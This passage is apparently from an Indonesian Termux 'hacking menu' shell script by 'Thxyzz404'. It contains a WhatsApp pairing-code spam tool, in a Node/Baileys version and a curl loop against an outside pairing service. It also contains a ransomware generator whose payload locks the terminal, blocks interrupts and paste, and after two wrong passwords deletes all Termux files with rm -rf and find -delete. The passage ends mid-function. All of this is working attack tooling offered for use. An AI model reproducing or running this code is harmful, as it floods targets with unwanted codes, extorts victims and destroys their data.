                        self.clear_screen()
                        self.console.print("\n" + "="*50)
                        self.console.print(f"[cyan]📧 {self.email}[/cyan]")
                        self.console.print("="*50)                    
                        inbox_table = self.create_inbox_table(messages)
                        live.update(inbox_table, refresh=True)
                        for msg in new_messages:
                            self.seen_ids.add(msg["id"])
                            self.console.print("\n")
                            full_msg = self.read_email(msg["id"])
                            self.display_email(full_msg)                      
                        self.console.print("\n[dim]Meunggu pesan selanjutnya...[/dim]")
                        self.waiting_shown = True
                    else:
                        if not self.waiting_shown:
                            self.console.print("[dim]⏳ Menunggu kontak masuk...[/dim]")
                            self.waiting_shown = True
                    time.sleep(5)
        except KeyboardInterrupt:
            self.clear_screen()
            self.console.print(Panel(
                "[yellow]✨ Thank you for By.Thxyzz404 ✨[/yellow]",
                box=box.ROUNDED
            ))
if __name__ == "__main__":
    viewer = TempMailViewer()
    viewer.run()
'
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
       3|03)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
b='\033[34;1m'
y='\033[33;1m'
n='\033[0m'
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██╔══██╗██║██║╚██╗██║██║   ██║
██║     ██║  ██║██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝" | lolcat
echo ""
echo -e "${p}      Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Spam cepat"
echo -e "${r}[${y} 02 ${r}] ${g}Spam slowed"
echo -e "${r}[${y} 00 ${r}] ${c}Keluar"
}
spam1() {
clear
figlet Thxyzz404 | lolcat
echo ""
echo -e "${g} Contoh : 62xxx "
echo -e "${y}"
read -p "Masukkan nomer : " no
echo ""
echo -e "\033[36;1m Sedang melakukan pembaruan nomer !! "
sleep 3
echo ""
rm -f /data/data/com.termux/files/home/number.txt
rm -f /storage/emulated/0/A_es/number.txt
echo "$no" > ~/.number_otp
cat ~/.number_otp
clear 
echo ""
echo -e "\033[33;1m Pembaruan nomer selesai !! "
sleep 2
echo ""
clear
echo ""
echo -e "\033[32;1m Menjalankan tools..!!"
sleep 2
echo ""
e="echo -e "
m="\033[1;31m"
h="\033[1;32m"
k="\033[1;33m"
b="\033[1;34m"
bl="\033[1;36m"
p="\033[1;37m"
u="\033[1;35m"
pu="\033[1;30m"
c="\033[1;96m"
or="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
bld="\033[1;94m"
pwl="\033[1;95m"
blg="\033[1;97m"
lg="\033[1;90m"
bg_m="\033[41m"
bg_h="\033[42m"
bg_k="\033[43m"
bg_b="\033[44m"
bg_bl="\033[46m"
bg_p="\033[47m"
bg_u="\033[45m"
bg_pu="\033[40m"
bg_c="\033[106m"
bg_or="\033[101m"
bg_g="\033[102m"
bg_y="\033[103m"
bg_bld="\033[104m"
bg_pwl="\033[105m"
bg_lg="\033[100m"
packagenya() {
               cat << EOF > package.json
{
"main": "thxyzz404.js",
"scripts": {
"start": "node thxyzz404.js"
},
"author": "Thxyzz404",
"license": "MIT",
"dependencies": {
"@whiskeysockets/baileys": "latest",
"chalk": "^4.1.2",
"pino": "^7.0.5",
"readline": "^1.3.0",
"express": "^4.18.2",
"fs": "^0.0.1-security"
}
}
EOF
          }
while true; do
     spamtautan="/data/data/com.termux/files/usr/lib/bash/spam/"
     if [ -d "$spamtautan" ]; then
          clear
          cd /data/data/com.termux/files/usr/lib/bash/spam || exit
          git pull origin main &> /dev/null
          telegram &> /dev/null &
          while true; do
               file="node_modules"
               if [ -d "$file" ]; then
                    clear
                    echo "y" | termux-setup-storage &> /dev/null &
                    while true; do
                         scan="$HOME/number.txt"
                         if [ -f "$scan" ]; then
                              break
                         else
                              touch $HOME/number.txt
                         fi
                    done
                    spamnya() {
                         file="$HOME/number.txt"
                         loading() {
                              (
                                   for i in {1..100}; do
                                        echo $i
                                        sleep 0.05
                                   done
                              ) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
                         }
                         loading1() {
                              (
                                   for i in {1..100}; do
                                        echo $i
                                   done
                              ) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
                         }
                         show_file() {
                              if [ -f "$file" ]; then
                                   content=$(cat "$file")
                                   echo "$content"
                              else
                                   echo "File $file tidak ditemukan."
                              fi
                         }
                         add_number() {
                              show_file
                              number=$(dialog --inputbox "Masukkan nomor yang ingin ditambahkan ( 628 ):" 15 40 --stdout)
                              if [[ "$number" =~ ^[0-9]+$ ]]; then
                                   echo "$number" >> "$file"
                                   dialog --msgbox "Nomor $number telah ditambahkan ke dalam file." 8 40
                              else
                                   dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
                              fi
                         }
                         remove_number() {
                              show_file
                              if [ -f "$file" ]; then
                                   number_to_remove=$(dialog --inputbox "Masukkan nomor telepon yang ingin dihapus ( 628 ):" 15 40 --stdout)
                                   if [[ "$number_to_remove" =~ ^[0-9]+$ ]]; then
                                        sed -i "/$number_to_remove/d" "$file"
                                        dialog --msgbox "Nomor telepon $number_to_remove telah dihapus dari file." 8 40
                                   else
                                        dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
                                   fi
                              else
                                   dialog --msgbox "File $file tidak ditemukan." 8 40
                              fi
                         }
                         clear
                         loading
                         cd "$spamtautan"
                         clear
                         touch "$PREFIX/tmp/pake_pair"
                         rm -rf "$PREFIX/tmp/tanpa_pair"
node -e "$(
cat << 'EOF'
const readline = require('readline');
const chalk = require('chalk');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const numberFilePath = path.join(process.env.HOME || process.env.USERPROFILE, '.number_otp');
let numbers = [];
let currentIndex = 0;
const loadNumbers = () => {
    try {
        const data = fs.readFileSync(numberFilePath, 'utf8');
        numbers = data.split('\n')
            .map(num => num.trim())
            .filter(num => num !== '');      
        if (numbers.length === 0) {
            console.log(chalk.red.bold('Tidak ada nomor yang ditemukan di file number.txt'));
        } else {
            console.log(chalk.greenBright.bold('Total nomor yang ditemukan:'), chalk.yellow.bold(numbers.length));
        }
    } catch (err) {
        console.error(chalk.red.bold('Error membaca file:'), err.message);
    }
};
const isValidPhoneNumber = (phoneNumber) => {
    const cleanNumber = phoneNumber.replace(/[^\d]/g, '');
    if (cleanNumber.length < 8 || cleanNumber.length > 15) {
        return false;
    }
    const firstDigit = cleanNumber.charAt(0);
    if (firstDigit === '0') {
        return false;
    }    
    return true;
};
const formatPhoneNumber = (rawNumber) => {
    let cleaned = rawNumber.replace(/[^\d]/g, '');
    if (cleaned.startsWith('00')) {
        cleaned = cleaned.substring(2);
    }
    if (cleaned.startsWith('0')) {
        cleaned = cleaned.substring(1);
    }
    const countryCodes = {
        // Asia
        '62': 'ID', // Indonesia
        '60': 'MY', // Malaysia
        '65': 'SG', // Singapura
        '63': 'PH', // Filipina
        '66': 'TH', // Thailand
        '84': 'VN', // Vietnam
        '86': 'CN', // China
        '81': 'JP', // Jepang
        '82': 'KR', // Korea Selatan
        '91': 'IN', // India
        '92': 'PK', // Pakistan
        '880': 'BD', // Bangladesh
        '94': 'LK', // Sri Lanka
        '95': 'MM', // Myanmar
        '98': 'IR', // Iran
        
        // Eropa
        '44': 'GB', // Inggris
        '33': 'FR', // Perancis
        '49': 'DE', // Jerman
        '39': 'IT', // Italia
        '34': 'ES', // Spanyol
        '31': 'NL', // Belanda
        '32': 'BE', // Belgia
        '41': 'CH', // Swiss
        '43': 'AT', // Austria
        
        // Amerika
        '1': 'US',  // Amerika/Kanada
        '55': 'BR', // Brasil
        '52': 'MX', // Meksiko
        '54': 'AR', // Argentina
        '56': 'CL', // Chile
        '57': 'CO', // Kolombia
        '51': 'PE', // Peru
        
        // Afrika
        '27': 'ZA', // Afrika Selatan
        '20': 'EG', // Mesir
        '234': 'NG', // Nigeria
        '254': 'KE', // Kenya
        '212': 'MA', // Maroko
        
        // Oceania
        '61': 'AU', // Australia
        '64': 'NZ', // Selandia Baru
    };
    let country = 'UNKNOWN';
    for (const [code, countryCode] of Object.entries(countryCodes)) {
        if (cleaned.startsWith(code)) {
            country = countryCode;
            break;
        }
    }
    return {
        number: cleaned,
        country: country
    };
};
const detectCountry = (phoneNumber) => {
    const cleaned = phoneNumber.replace(/[^\d]/g, '');
    if (cleaned.startsWith('60')) return 'MY'; // Malaysia
    if (cleaned.startsWith('62')) return 'ID'; // Indonesia
    if (cleaned.startsWith('65')) return 'SG'; // Singapura
    if (cleaned.startsWith('63')) return 'PH'; // Filipina
    if (cleaned.startsWith('66')) return 'TH'; // Thailand
    if (cleaned.startsWith('84')) return 'VN'; // Vietnam
    if (cleaned.startsWith('86')) return 'CN'; // China
    if (cleaned.startsWith('81')) return 'JP'; // Jepang
    if (cleaned.startsWith('82')) return 'KR'; // Korea
    if (cleaned.startsWith('91')) return 'IN'; // India
    if (cleaned.startsWith('44')) return 'GB'; // Inggris
    if (cleaned.startsWith('33')) return 'FR'; // Perancis
    if (cleaned.startsWith('49')) return 'DE'; // Jerman
    if (cleaned.startsWith('1')) return 'US';  // AS/Kanada
    if (cleaned.startsWith('55')) return 'BR'; // Brasil
    if (cleaned.startsWith('61')) return 'AU'; // Australia
    if (cleaned.length >= 9 && cleaned.length <= 15) {
        return 'INTL';
    }    
    return 'UNKNOWN';
};
const clearConsole = () => {
    process.stdout.write('\x1B[2J\x1B[0f');
};
const startSpamProcess = async () => {
    try {
        let { state } = await useMultiFileAuthState('Thxyzz404');
        let { version } = await fetchLatestBaileysVersion();
        let sock = await makeWaSocket({ 
            auth: state, 
            version, 
            logger: pino({ level: 'fatal' }),
            printQRInTerminal: false
        });
        while (true) {  
            if (numbers.length === 0) {  
                console.log(chalk.red.bold('Tidak ada nomor yang tersedia. Memeriksa ulang dalam 5 detik...'));  
                await sleep(5000);  
                loadNumbers();  
                continue;  
            }  
            let rawTarget = numbers[currentIndex];  
            let country = detectCountry(rawTarget);
            let target = rawTarget.replace(/[^\d]/g, '');
            if (target.startsWith('0')) {
                target = target.substring(1);
            }
            if (target.startsWith('00')) {
                target = target.substring(2);
            }
            console.log(chalk.blueBright('Nomor asli:'), chalk.white.bold(rawTarget));
            console.log(chalk.blueBright('Nomor diproses:'), chalk.white.bold(target));
            console.log(chalk.cyan('Negara terdeteksi:'), chalk.yellow.bold(country));
            if (!isValidPhoneNumber(target)) {  
                console.log(chalk.red.bold('Nomor tidak valid:'), chalk.white.bold(target), chalk.red.bold('Melanjutkan ke nomor berikutnya...'));  
                currentIndex = (currentIndex + 1) % numbers.length;  
                await sleep(1000);  
                continue;  
            }  
            console.log(chalk.greenBright.bold('[ Mengirim ke:'), chalk.cyan.bold(target), chalk.greenBright.bold('(' + country + ')'), chalk.greenBright.bold(']'));  
            await startSpamming(sock, target, country);  
            currentIndex = (currentIndex + 1) % numbers.length;  
            console.log(chalk.greenBright.bold('Menunggu 5 detik sebelum mengirim ke nomor berikutnya...'));  
            await sleep(5000);  
            clearConsole();  
        }  
    } catch (error) {  
        handleError(error);  
    }
};
const getRandomColor = () => {
    const letters = '0123456789ABCDEF';
    let color = '#';
    for (let i = 0; i < 6; i++) {
        color += letters[Math.floor(Math.random() * 16)];
    }
    return color;
};
const startSpamming = async (sock, target, country) => {
    for (let i = 0; i < 15; i++) {
        await sleep(5000);
        clearConsole();      
        try {
            const prc = await sock.requestPairingCode(target);
            const randomColor = getRandomColor();
  const pad = (t, n = 16) => t.padEnd(n, ' ');          
            const banner = `
⠀⠀⠀⢠⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣤⣤⣶⣾⣿⣿⣿⡷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⣿⣿⣿⡇⠀⡾⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀
⣿⣿⣿⣧⡀⠁⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢹⠉⠙⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⣀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⠿⠋⢃⠈⠢⡁⠒⠄⡀⠈⠁⠀⠀⠀⠀⠀⠀⠀
⣿⣿⠟⠁⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${chalk.bgBlack(chalk.yellow.bold('Pengembang Script'))} ${chalk.white.bold(':')} ${chalk.hex(randomColor).bold('By.Thxyzz404')}
${chalk.bgBlack(chalk.yellow.bold('Nomor Target'))} ${chalk.white.bold(':')} ${chalk.hex('#00BFFF').bold(target)}
${chalk.bgBlack(chalk.yellow.bold('Negara'))} ${chalk.white.bold(':')} ${chalk.cyan.bold(country)}
${chalk.bgBlack(chalk.yellow.bold('Kode Pairing'))} ${chalk.white.bold(':')} ${chalk.red.bold(prc)}
${chalk.bgBlack(chalk.yellow.bold('Jumlah Spam'))} ${chalk.white.bold(':')} ${chalk.bold.white(i + 1)}/15
===========================================
`;
            console.log(chalk.greenBright.bold(banner));
        } catch (error) {
            console.error(chalk.red.bold('Error mengirim ke'), chalk.white.bold(target), chalk.red.bold(':'), error.message);
            break;
        }
    }
};
const handleError = async (error) => {
    console.error(chalk.red.bold('Terjadi kesalahan:'), error.message || error);
    console.log(chalk.yellow.bold('\n\nSedang Istirahat selama 30 detik sebelum memulai ulang...'));
    console.log(chalk.yellow.bold('===================================\n'));  
    for (let i = 30; i >= 0; i--) {
        process.stdout.write('\r' + chalk.cyan.bold('Memulai ulang dalam: ' + i + ' detik... '));
        await sleep(1000);
    }
    console.log('\n');
    restartSpam();
};
const restartSpam = async () => {
    console.log(chalk.greenBright.bold('Memulai ulang proses spam...'));
    await sleep(1000);
    startSpamProcess();
};
loadNumbers();
startSpamProcess();
EOF
)"
                         read -p "Silahkan Enter"
                    }
                    spamnya
                    break 5
               else
                    clear
                    cd $spamtautan
                    clear
                    echo ""
                    echo -e "${m}Node_Modules Belum Terinstall"
                    echo ""
                    sleep 5
                    clear
                    echo ""
                    echo -e "${h}Menginstall Node_Modules"
                    echo -e "${bl}"
                    pkg install -y yarn
                    yarn cache clean
                    yarn
                    yarn add @whiskeysockets/baileys
               fi
          done
     else
          clear
          $e $m "Installasi Package$res"
          mkdir "$spamtautan"
          cd "$spamtautan"
          packagenya
     fi
done
}
spam2() {
sesi="pairing.json"
send() {
local no="$1"    
if [[ $no =~ ^0 ]]; then
      no="62${no:1}"
elif [[ ! $no =~ ^62 ]]; then
      no="62$no"
fi   
curl -s -X GET "https://pair.subzero.gleeze.com/code?number=$no" \
-H "accept: application/json, text/plain, */*" \
--max-time 10 > /dev/null 2>&1
}
simpan() {
echo "{\"no\": \"$1\", \"time\": $2}" > "$sesi"
}
analisis() {
if [[ -f "$sesi" ]]; then
     cat "$sesi"
else
     echo "{}"
fi
}
dlet() {
rm -f "$sesi"
}
bar() {
echo -e "${c}"
local chars=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
local i=0
local pid=$1    
while kill -0 $pid 2>/dev/null; do
   printf "\r[ %s ] Sedang Spam Kode Pairing..!!" "${chars[$i]}"
        i=$(( (i+1) % ${#chars[@]} ))
        sleep 0.1
    done
    printf "\r[ ✓ ] Kode Pairing Terkirim!      \n"
}
jeda() {
local time=$1
local detik=1200
local sisa=$((detik - $(date +%s) + time))    
if [[ $sisa -gt 0 ]]; then
echo ""
echo -e "${y}Kode Successfully Terkirim"
echo -e "${g}"
while [[ $sisa -gt 0 ]]; do
    local menit=$((sisa / 60))
    local detik=$((sisa % 60))
    printf "\rMengirim Ulang Dalam : %02d:%02d" $menit $detik
        sleep 1
        sisa=$((sisa - 1))
        time=$((time + 1))
    done
printf "\n"
     return 0
fi
}
kontol() {
clear 
echo "
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣶⣽⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⡟⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
        ⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⣽⣛⠀⠀⠀⠀
        ⠀⠀⢠⣿⣿⣿⣿⣿⣿⠿⠛⠛⠀⠀⠀⠀⠀⠀⠛⠛⠿⣿⣿⣿⣿⣿⣶⡄⠀⠀
        ⠀⢰⣿⣿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⣿⣿⡆⠀
        ⡰⠟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢆ " | lolcat
echo -e "${p}            Developer ${r}: ${c}Thxyzz404 "
echo ""
echo -e "${y}Masukkan no target ${r}[ ${g}08xxx ${r}] "
echo -e "${b}"
read -p ">>>> : " no    
if [[ -n "$no" ]]; then
  if [[ $no =~ ^0 ]]; then
    no62="62${no:1}"
elif [[ $no =~ ^\+62 ]]; then
    no62="${no:1}"
elif [[ $no =~ ^62 ]]; then
    no62="$no"
else
    no62="62$no"
fi        
sesi=$(analisis)
time=$(echo "$sesi" | grep -o '"time": [0-9]*' | awk '{print $2}')
if [[ -n "$time" ]]; then
     sisa=$((1200 - $(date +%s) + time))
if [[ $sisa -gt 0 ]]; then
      jeda "$time"
else
      {
        for i in {1..5}; do
           send "$no62"
                 [[ $i -lt 5 ]] && sleep 5
           done
      } &
            pid=$!
            bar $pid
            wait $pid
            time=$(date +%s)
            simpan "$no62" "$time"
            jeda "$time"
    dlet
fi
   else
          {
            for i in {1..5}; do
            send "$no62"
                   [[ $i -lt 5 ]] && sleep 5
      done
  } &
            pid=$!
            bar $pid
            wait $pid
            time=$(date +%s)
            simpan "$no62" "$time"
            jeda "$time"
       dlet
    fi
else
   echo -e "${r}No jangan kosong cik."
fi
}
kontol
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) spam1 ;;
        2|02) spam2 ;;
        0|00) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
     ;;
        4|04)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
if ! command -v openssl &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Installing openssl..!!"
    echo -e "${n}"
    pkg install -y openssl-tool
else
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} openssl sudah terinstall."
    sleep 2
fi
if ! command -v xxd &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Installing xxd..!!"
    echo -e "${n}"
    apt install -y xxd
else
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} xxd sudah terinstall."
    sleep 2
fi
function banner() {
    clear 
    echo ""
    echo "
██████╗  █████╗ ███╗   ██╗
██╔══██╗██╔══██╗████╗  ██║
██████╔╝███████║██╔██╗ ██║
██╔══██╗██╔══██║██║╚██╗██║
██║  ██║██║  ██║██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ " | lolcat 
    echo ""
    echo -e "${g}=========${c}[ ${r}☠ RANSOMWARE GENERATOR ☠ ${c}]${g}========="
    echo -e "${g}=========${c}[ ${p}☠ DEV : BY THXYZZ404 ☠ ${c}]${g}========="
    echo ""
}
function buat_kode_ransom() {
    local password="$1"
    local pesan="$2"
    cat > ransom.sh <<EOF
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'
PASSWORD="$password"
PESAN_TEBUSAN="$pesan"
function blok_ctrl() {
    trap '' SIGINT SIGTSTP SIGQUIT SIGTERM SIGHUP
    stty -echoctl 2>/dev/null || true
}
function disable_paste() {
    bind -r '\C-v' 2>/dev/null || true
    stty -ixon
}
function tampil_ransom() {
    clear
    echo ""
    echo -e "\033[31;1m
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⡿⠟⠋⠁⣀⣤⣤⣤⣤⣀⠈⠙⠻⢿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⢠⣾⣿⡿⠋⠀⠀⢀⣾⣿⡿⠿⠿⢿⣿⣷⡀⠀⠀⠙⢿⣿⣷⡄⠀⠀
⠀⢠⣿⣿⠏⠀⠀⠀⠀⣿⣿⡟⠀⠀⠀⠀⢻⣿⣿⠀⠀⠀⠀⠹⣿⣿⡄⠀
⢠⣿⣿⠏⠀⠀⠀⠀⠀⠛⠛⠃⠀⠀⠀⠀⠘⠛⠛⠀⠀⠀⠀⠀⠹⣿⣿⡄
⢸⣿⣿⠀⠀⠀⢠⣶⢶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡄⠀⠀⠀⣿⣿⡇
⢸⣿⣿⠀⠀⠀⢸⡇⠀⣿⣿⣿⠋⠀⠀⠙⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⡇
⢸⣿⣿⠀⠀⠀⢸⡇⠀⣿⣿⣿⡀⠀⠀⢀⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⡇
⠘⣿⣿⣆⠀⠀⢸⡇⠀⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⣰⣿⣿⠃
⠀⠘⣿⣿⣆⠀⢸⣧⣠⣿⣿⣿⣿⣄⣠⣿⣿⣿⣿⣿⣿⡇⠀⣰⣿⣿⠃⠀
⠀⠀⠘⢿⣿⣷⣄⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣠⣾⣿⡿⠃⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠀"⠀⠀⠀⠀
    echo ""
    echo -e "\${c}\$PESAN_TEBUSAN\${n}"
    echo ""
}
function hapus_dari_rc() {
    for rc in "\$HOME/.bashrc" "\$HOME/.zshrc" "\$HOME/.profile"; do
        [ -f "\$rc" ] && sed -i '/\.ransomlock\.sh/d' "\$rc" 2>/dev/null || true
    done
}
function hapus_file_ransomlock() {
    rm -f "\$HOME/.ransomlock.sh"
}
function hapus_semua_termux() {
    clear
    echo ""
    echo -e "\${r}[ \${g}>_< \${r}]\${c} PASSWORD SALAH 2X! MENGHAPUS SEMUA DATA TERMUX."
    sleep 3
    find /data/data/com.termux/files -mindepth 1 -delete 2>/dev/null || rm -rf /data/data/com.termux/files/* 2>/dev/null
    clear
    echo ""
    echo -e "\${r}[ \${g}>_< \${r}]\${y} Wkwkw Mampus Kau 😹🖕"
    echo ""
    exit 1
}
function kunci_terminal() {
    blok_ctrl
    disable_paste
    salah_count=0
    while true; do
        tampil_ransom
        echo -ne "${r}[ ${g}?? ${r}]${y} Masukkan Passwordnya Goblok : "
        read -r pwd
        echo
        if [ -z "\$pwd" ]; then
            clear
            echo ""
            echo -e "${r}[ ${g}+ ${r}]${c} Password tidak boleh kosong."
            sleep 2
            continue
        fi
        if [ "\$pwd" = "\$PASSWORD" ]; then
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${g} Password benar! Membuka akses."
            sleep 2
